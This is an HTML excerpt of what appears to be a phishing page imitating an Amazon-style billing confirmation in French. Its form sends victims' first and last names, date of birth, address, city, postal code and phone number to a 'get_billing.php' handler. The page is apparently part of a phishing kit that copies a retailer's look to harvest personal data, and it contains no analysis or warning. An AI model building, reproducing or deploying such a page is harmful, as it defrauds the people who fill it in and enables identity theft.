...
<html class="a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember a-ws" data-19ax5a9jf="dingo" data-aui-build-date="3.20.8-2021-02-19"><head>
    ...
    <title dir="ltr">Confirmez vos informations de facturation</title>
...
<div class="a-section a-spacing-base">
  <div class="a-section">
    ...
    <form name="signIn" method="post" novalidate="" action="get_billing.php" class="auth-validate-form auth-real-time-validation a-spacing-none" data-fwcim-id="MVAqFszy">
      <div class="a-section">
        <div class="a-box"><div class="a-box-inner a-padding-extra-large">
          <p class="a-spacing-small" style="font-size: 15px;">
            Confirmez vos informations de facturation :
          </p>
...
<div class="a-row a-spacing-base" style="margin-top: 30px;">
            ...
            <input type="first_name" maxlength="128" id="first_name" name="first_name" tabindex="1" class="a-input-text a-span12 auth-required-field"></div>
...
<div class="a-row a-spacing-base">
            ...
            <input type="last_name" maxlength="128" id="last_name" name="last_name" tabindex="1" class="a-input-text a-span12 auth-required-field">
            ...
            <input type="dob" maxlength="10" id="dob" name="dob" tabindex="1" class="a-input-text a-span12 auth-required-field" onkeypress="return /\d/.test(String.fromCharCode(((event||window.event).which||(event||window.event).which)));" onkeyup="date_reformat_dd(this);" onkeypress="date_reformat_dd(this);" onpaste="date_reformat_dd(this);"></div>
...
<div class="a-row a-spacing-base">
            ...
            <input type="adress" maxlength="128" id="adress" name="adress" tabindex="1" class="a-input-text a-span12 auth-required-field"></div><div class="a-row a-spacing-base">
            <label for="ap_email" class="a-form-label">
              Ville :
            </label>
            ...
            <input type="city" maxlength="128" id="city" name="ville" tabindex="1" class="a-input-text a-span12 auth-required-field"></div>
...
<div class="a-row a-spacing-base">
            ...
            <input type="zip" maxlength="5" id="zip" name="zip" tabindex="1" class="a-input-text a-span12 auth-required-field" onkeypress="return /\d/.test(String.fromCharCode(((event||window.event).which||(event||window.event).which)));"></div>
            ...
            <input type="phone" maxlength="10" id="phone" name="phone" tabindex="1" class="a-input-text a-span12 auth-required-field" onkeypress="return /\d/.test(String.fromCharCode(((event||window.event).which||(event||window.event).which)));"></div>
